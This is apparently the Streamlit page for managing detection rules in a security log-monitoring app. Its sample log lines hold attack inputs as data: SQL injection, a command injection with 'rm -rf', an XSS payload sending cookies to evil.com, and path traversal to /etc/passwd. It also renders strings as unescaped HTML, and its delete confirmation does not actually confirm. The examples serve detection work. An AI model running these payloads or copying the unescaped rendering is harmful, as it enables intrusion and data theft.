import streamlit as st

from database.models import DetectionRule
from auth.access_control import is_admin
from utils.validators import sanitize_text, validate_rule_condition
from services.audit_service import (
    log_action, ACTION_RULE_CREATE, ACTION_RULE_UPDATE,
    ACTION_RULE_DELETE, ACTION_RULE_TOGGLE,
)
from config.settings import now_ist
from services.recommendations import _RULE_ACTIONS

# ── Example log snippets per rule ─────────────────────────────────────────────
_RULE_EXAMPLES: dict[str, str] = {
    "SQL Injection Attempt":
        "2024-01-15 14:23:07 WARN  GET /search?q=' OR 1=1--&user=admin [192.168.1.42]",
    "Command Injection":
        "2024-01-15 14:23:45 WARN  POST /api/ping host='; rm -rf /var/www; echo 'pwned'",
    "XSS Attempt":
        "2024-01-15 14:24:01 WARN  GET /comment?text=<script>document.location='http://evil.com/'+document.cookie</script>",
    "Path Traversal Attempt":
        "2024-01-15 14:24:22 WARN  GET /download?file=../../etc/passwd [192.168.1.42]",
    "Directory Scanning":
        "2024-01-15 14:25:00 WARN  GET /admin/config.php 404  GET /.git/config 403  GET /backup.sql 404",
    "Abnormal HTTP Methods":
        "2024-01-15 14:25:30 WARN  TRACE /api/v1/users HTTP/1.1 200 [192.168.1.55]",
    "Dormant Account Activity":
        "2024-01-15 14:26:00 INFO  User 'svc_backup' authenticated — last login was 247 days ago",
    "Concurrent Sessions":
        "2024-01-15 14:26:15 WARN  User 'jsmith' active session from 192.168.1.10 AND 203.0.113.44 simultaneously",
    "Geographic Anomaly":
        "2024-01-15 14:27:00 WARN  Login from unusual location: user 'alee' authenticated from CN (last login: GB)",
    "Unusual Working Hours":
        "2024-01-15 23:47:33 INFO  User 'contractor1' accessed 142 records outside business hours",
    "Off-Hours Access":
        "2024-01-16 02:14:51 WARN  Successful login: user 'dbadmin' at 02:14 from 10.0.0.5",
    "Unauthorized Access Attempt":
        "2024-01-15 14:28:00 WARN  GET /admin/users HTTP/1.1 403 Forbidden [user=guest, IP=10.0.1.5]",
    "Privilege Escalation":
        "2024-01-15 14:29:10 CRITICAL sudo: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
    "Sensitive Resource Access":
        "2024-01-15 14:30:00 WARN  File read: /etc/shadow accessed by process 'python3' (PID 4821)",
    "API Key Misuse":
        "2024-01-15 14:31:00 ERROR  API auth failed: invalid_api_key for key sk-prod-...abc [endpoint=/v2/data]",
    "Session Hijacking Pattern":
        "2024-01-15 14:32:00 WARN  Session fixation detected: session_id unchanged after login for user 'bob'",
    "Account Lockout Event":
        "2024-01-15 14:33:00 WARN  Account 'alice' locked after 5 consecutive failed password attempts from 203.0.113.22",
    "Successful Login After Failures":
        "2024-01-15 14:34:00 INFO  Login SUCCESS for 'carol' after 7 FAILED attempts from 203.0.113.22",
    "Brute Force Attack":
        "2024-01-15 14:35:00 CRITICAL [Dynamic] 148 failed logins from 203.0.113.22 in 60 seconds",
    "Repeated Failed Logins":
        "2024-01-15 14:36:00 HIGH   [Dynamic] User 'admin' had 12 failed logins in 300 seconds",
    "Rapid Login Attempts":
        "2024-01-15 14:37:00 HIGH   [Dynamic] 250 login attempts from 198.51.100.7 in 120 seconds",
    "Multiple User Failures":
        "2024-01-15 14:38:00 CRITICAL [Dynamic] 45 different usernames failed login from 198.51.100.7 in 300 seconds",
    "Repeated Access Denials":
        "2024-01-15 14:39:00 MEDIUM [Dynamic] 30 HTTP 403 responses to 192.168.1.99 in 60 seconds",
    "Error Rate Spike":
        "2024-01-15 14:40:00 HIGH   [Dynamic] 512 application errors in 60 seconds (baseline: 8/min)",
    "Service Crash Loop":
        "2024-01-15 14:41:00 HIGH   [Dynamic] Service 'nginx' crashed and restarted 6 times in 300 seconds",
    "Rapid Sequential Actions":
        "2024-01-15 14:42:00 MEDIUM [Dynamic] User 'etl_svc' performed 850 API calls in 60 seconds",
    "Mass Data Access":
        "2024-01-15 14:43:00 CRITICAL [Dynamic] User 'reports' accessed 12,000 customer records in 120 seconds",
    "Resource Exhaustion":
        "2024-01-15 14:44:00 HIGH   [Dynamic] OOM kill: process 'mysqld' used 98% RAM — system critical",
    "Unexpected Shutdown":
        "2024-01-15 14:45:00 HIGH   [Dynamic] System shutdown signal received (source: unknown) — 3 events in 300s",
    "Configuration Change":
        "2024-01-15 14:46:00 MEDIUM [Dynamic] sshd_config modified by user 'deploy' — PermitRootLogin changed to yes",
    "Database Error Spike":
        "2024-01-15 14:47:00 MEDIUM [Dynamic] 200 database errors in 60 seconds — possible injection attack",
}

# ── Plain-language rule descriptions ─────────────────────────────────────────
_RULE_PLAIN_DESC: dict[str, str] = {
    "SQL Injection Attempt":
        "Detects attempts to manipulate database queries by injecting SQL keywords into user-supplied input fields.",
    "Command Injection":
        "Identifies requests containing shell metacharacters or OS commands that may execute on the server.",
    "XSS Attempt":
        "Detects cross-site scripting payloads including <script> tags and javascript: URI schemes in requests.",
    "Path Traversal Attempt":
        "Catches attempts to navigate outside the web root using ../ sequences or URL-encoded equivalents.",
    "Directory Scanning":
        "Flags systematic requests to common sensitive paths (admin panels, config files, backup directories).",
    "Abnormal HTTP Methods":
        "Detects rarely-used HTTP methods (TRACE, CONNECT, WebDAV) used in reconnaissance and proxy attacks.",
    "Dormant Account Activity":
        "Triggers when an account that has been inactive for an extended period suddenly becomes active.",
    "Concurrent Sessions":
        "Alerts on a single account having multiple active sessions from different IP addresses simultaneously.",
    "Geographic Anomaly":
        "Detects logins from countries or regions not previously associated with the account.",
    "Unusual Working Hours":
        "Flags significant activity (files accessed, queries run) outside normal 09:00–17:00 business hours.",
    "Off-Hours Access":
        "Detects successful logins occurring between midnight and 05:00 when most environments are unattended.",
    "Unauthorized Access Attempt":
        "Catches HTTP 403 Forbidden and 401 Unauthorized responses indicating access control violations.",
    "Privilege Escalation":
        "Detects use of sudo, su, and similar privilege-elevation commands to gain root or admin access.",
    "Sensitive Resource Access":
        "Triggers on access to critical system files: /etc/passwd, /etc/shadow, SSH keys, and certificates.",
    "API Key Misuse":
        "Detects invalid, expired, or revoked API key usage indicating credential testing or key compromise.",
    "Session Hijacking Pattern":
        "Identifies session fixation, CSRF, and cookie manipulation patterns used to steal authenticated sessions.",
    "Account Lockout Event":
        "Detects when an account is locked after too many failed authentication attempts.",
    "Successful Login After Failures":
        "Flags a successful login that immediately follows multiple failed attempts — possible brute-force success.",
    "Brute Force Attack":
        "Behavioral rule: triggers when a single IP produces an abnormally high count of failed logins in a short window.",
    "Repeated Failed Logins":
        "Behavioral rule: tracks failed login counts per username and alerts when a threshold is exceeded.",
    "Rapid Login Attempts":
        "Behavioral rule: detects high-velocity login attempts from a single source, indicating an automated tool.",
    "Multiple User Failures":
        "Behavioral rule: identifies one IP attempting many different usernames — a credential stuffing attack.",
    "Repeated Access Denials":
        "Behavioral rule: alerts when a source generates many 403/401 errors, indicating systematic ACL probing.",
    "Error Rate Spike":
        "Behavioral rule: triggers when application error rates sharply exceed the baseline — possible attack or exploit.",
    "Service Crash Loop":
        "Behavioral rule: alerts when a service crashes and restarts repeatedly in a short period.",
    "Rapid Sequential Actions":
        "Behavioral rule: detects bot-like behaviour when a user account performs far more actions per minute than normal.",
    "Mass Data Access":
        "Behavioral rule: flags accounts that read an unusually large number of records rapidly — data exfiltration indicator.",
    "Resource Exhaustion":
        "Behavioral rule: detects out-of-memory, disk-full, and CPU saturation events that may indicate a DoS attack.",
    "Unexpected Shutdown":
        "Behavioral rule: alerts on unplanned system/service shutdowns that may result from exploit payloads.",
    "Configuration Change":
        "Behavioral rule: tracks changes to critical configuration files and alerts on unexpected modifications.",
    "Database Error Spike":
        "Behavioral rule: triggers when the database returns an elevated error rate suggesting injection or instability.",
}

def render_rules_page(user, db):
    admin = is_admin()

    if admin:
        st.markdown(
            '<div class="page-header">'
            '<div class="page-title">Threat Detection Rules</div>'
            '<div class="page-subtitle">Create, edit, enable/disable, and delete detection rules — changes apply immediately</div>'
            "</div>",
            unsafe_allow_html=True,
        )
    else:
        st.markdown(
            '<div class="page-header">'
            '<div class="page-title">Detection Rules</div>'
            '<div class="page-subtitle">Active threat detection rules — what the system monitors and why</div>'
            "</div>",
            unsafe_allow_html=True,
        )

    tab_static, tab_dynamic = st.tabs(["Static Rules (Pattern-Based)", "Dynamic Rules (Behavioral)"])

    with tab_static:
        st.markdown(
            '<div class="info-box">'
            '<strong>Static rules</strong> match individual log lines using text patterns. '
            'Each line is checked as it is parsed — zero accumulation needed.'
            '</div>',
            unsafe_allow_html=True,
        )
        _show_rules_section(db, user, admin, is_static=True)

    with tab_dynamic:
        st.markdown(
            '<div class="info-box">'
            '<strong>Dynamic (behavioral) rules</strong> count events over a time window. '
            'A threat is raised only when the count exceeds the configured threshold — '
            'they catch patterns that individual lines miss.'
            '</div>',
            unsafe_allow_html=True,
        )
        _show_rules_section(db, user, admin, is_static=False)

    if admin:
        st.divider()
        st.subheader("Add New Rule")
        _show_add_rule_form(db, user)


def _show_rules_section(db, user, admin: bool, is_static: bool):
    label = "Static" if is_static else "Dynamic"
    rules = (
        db.query(DetectionRule)
        .filter_by(is_static=is_static)
        .order_by(DetectionRule.severity.desc(), DetectionRule.rule_name)
        .all()
    )

    if not rules:
        st.markdown(
            f'<div class="info-box">No {label.lower()} rules configured.</div>',
            unsafe_allow_html=True,
        )
        return

    enabled_count  = sum(1 for r in rules if r.is_enabled)
    disabled_count = len(rules) - enabled_count
    st.caption(
        f"{len(rules)} {label.lower()} rules &nbsp;·&nbsp; "
        f"**{enabled_count}** enabled &nbsp;·&nbsp; {disabled_count} disabled"
    )

    for rule in rules:
        status  = "Enabled" if rule.is_enabled else "Disabled"
        header  = f"**{rule.rule_name}** — {rule.severity} — {status}"

        with st.expander(header, expanded=False):
            col_main, col_ctrl = st.columns([3, 1]) if admin else (st.columns([1])[0], None)

            with col_main:
                # Plain-language description
                plain_desc = _RULE_PLAIN_DESC.get(rule.rule_name, rule.description or "")
                st.markdown(f"**What it detects:** {plain_desc}")

                rec = _RULE_ACTIONS.get(rule.rule_name)

                if rec:
                    # Why Suspicious
                    st.markdown(
                        f'<div class="rule-why"><strong>Why suspicious:</strong> {rec["why"]}</div>',
                        unsafe_allow_html=True,
                    )
                    # Security Impact
                    st.markdown(
                        f'<div class="rule-impact"><strong>Security impact:</strong> {rec["impact"]}</div>',
                        unsafe_allow_html=True,
                    )
                    # Recommended Actions (first 4)
                    actions_html = "".join(
                        f"<li>{a}</li>" for a in rec["actions"][:3]
                    )
                    st.markdown(
                        f'<div class="rule-action"><strong>Recommended actions:</strong><ol style="margin:4px 0 0 16px;padding:0;">{actions_html}</ol></div>',
                        unsafe_allow_html=True,
                    )

                # Example log entry
                example = _RULE_EXAMPLES.get(rule.rule_name, "")
                if example:
                    st.markdown(
                        f'<div class="rule-example"><strong>Example:</strong><br><code>{example}</code></div>',
                        unsafe_allow_html=True,
                    )

                # Admin-only: show raw condition
                if admin:
                    with st.expander("Technical condition (admin only)", expanded=False):
                        st.code(rule.condition, language="text")
                        if not rule.is_static and rule.default_threshold is not None:
                            st.markdown(
                                f"**Threshold:** `{rule.default_threshold}` events &nbsp;·&nbsp; "
                                f"**Window:** `{rule.time_window_seconds or 0}s`"
                            )

                updated = rule.updated_at
                updated_str = updated.strftime("%Y-%m-%d %H:%M") if updated else "N/A"
                st.caption(f"Rule ID: {rule.id} &nbsp;·&nbsp; Last updated: {updated_str} IST")

            if admin and col_ctrl is not None:
                with col_ctrl:
                    _admin_rule_controls(rule, db, user)


def _admin_rule_controls(rule: DetectionRule, db, user):
    kp = f"rule_{rule.id}"

    if st.button(
        "Disable" if rule.is_enabled else "Enable",
        key=f"{kp}_toggle",
        width='stretch',
        type="secondary" if rule.is_enabled else "primary",
    ):
        rule.is_enabled = not rule.is_enabled
        rule.updated_at = now_ist()
        db.commit()
        log_action(
            user.id, ACTION_RULE_TOGGLE, db,
            details=f"Rule '{rule.rule_name}' {'enabled' if rule.is_enabled else 'disabled'}.",
        )
        st.rerun()

    if st.button("Edit", key=f"{kp}_edit", width='stretch'):
        st.session_state["editing_rule_id"] = rule.id
        st.rerun()

    if st.button("Delete", key=f"{kp}_delete", width='stretch'):
        st.session_state[f"confirm_delete_{rule.id}"] = True

    if st.session_state.pop(f"confirm_delete_{rule.id}", False):
        db.delete(rule)
        db.commit()
        log_action(user.id, ACTION_RULE_DELETE, db, details=f"Rule '{rule.rule_name}' deleted.")
        st.success(f"Rule '{rule.rule_name}' deleted.")
        st.rerun()

    if st.session_state.get("editing_rule_id") == rule.id:
        _show_edit_form(rule, db, user)


def _show_edit_form(rule: DetectionRule, db, user):
    st.markdown("---")
    st.markdown("**Edit Rule**")
    with st.form(f"edit_rule_{rule.id}"):
        new_desc  = st.text_area("Description", value=rule.description or "", max_chars=500)
        new_cond  = st.text_area("Condition (regex or metric key)", value=rule.condition, height=80)
        sev_opts  = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
        new_sev   = st.selectbox("Severity", sev_opts, index=sev_opts.index(rule.severity))
        new_thresh = None
        new_window = None
        if not rule.is_static:
            new_thresh = st.number_input("Threshold", min_value=1, max_value=100000,
                                          value=rule.default_threshold or 5)
            new_window = st.number_input("Time Window (seconds)", min_value=0, max_value=86400,
                                          value=rule.time_window_seconds or 300)
        col_save, col_cancel = st.columns(2)
        save   = col_save.form_submit_button("Save Changes", type="primary")
        cancel = col_cancel.form_submit_button("Cancel")

    if save:
        valid_cond, err = validate_rule_condition(new_cond)
        if not valid_cond:
            st.error(err)
        else:
            rule.description = sanitize_text(new_desc, 500)
            rule.condition   = new_cond
            rule.severity    = new_sev
            if new_thresh is not None:
                rule.default_threshold   = int(new_thresh)
                rule.time_window_seconds = int(new_window)
            rule.updated_at = now_ist()
            db.commit()
            log_action(user.id, ACTION_RULE_UPDATE, db, details=f"Rule '{rule.rule_name}' updated.")
            st.session_state.pop("editing_rule_id", None)
            st.success("Rule updated successfully.")
            st.rerun()

    if cancel:
        st.session_state.pop("editing_rule_id", None)
        st.rerun()


def _show_add_rule_form(db, user):
    with st.container(border=True):
        with st.form("add_rule_form", clear_on_submit=True):
            col_a, col_b = st.columns(2)
            with col_a:
                rule_name = st.text_input("Rule Name *", max_chars=150)
                rule_type = st.selectbox("Rule Type", ["static", "dynamic"])
            with col_b:
                severity    = st.selectbox("Severity *", ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"])
                description = st.text_input("Description", max_chars=500)

            is_static = rule_type == "static"
            condition = st.text_area(
                "Condition *",
                placeholder="Regex pattern (static) or metric key (dynamic, e.g. brute_force)",
                height=70,
            )

            threshold = None
            window    = None
            if not is_static:
                col_t, col_w = st.columns(2)
                with col_t:
                    threshold = st.number_input("Threshold *", min_value=1, max_value=100000, value=5)
                with col_w:
                    window = st.number_input("Time Window (sec) *", min_value=0, max_value=86400, value=300)

            submitted = st.form_submit_button("Add Rule", type="primary", width='stretch')

    if submitted:
        if not rule_name.strip() or not condition.strip():
            st.error("Rule name and condition are required.")
            return
        valid_cond, err = validate_rule_condition(condition)
        if not valid_cond:
            st.error(err)
            return
        if db.query(DetectionRule).filter_by(rule_name=rule_name.strip()).first():
            st.error("A rule with this name already exists.")
            return

        now = now_ist()
        new_rule = DetectionRule(
            rule_name=sanitize_text(rule_name.strip(), 150),
            rule_type=rule_type,
            condition=condition.strip(),
            severity=severity,
            description=sanitize_text(description, 500),
            is_static=is_static,
            default_threshold=int(threshold) if threshold else None,
            time_window_seconds=int(window) if window else None,
            is_enabled=True,
            created_by=user.id,
            created_at=now,
            updated_at=now,
        )
        db.add(new_rule)
        db.commit()
        log_action(user.id, ACTION_RULE_CREATE, db, details=f"Created rule: {rule_name}")
        st.success(f"Rule **{rule_name}** created and is now active.")
        st.rerun()
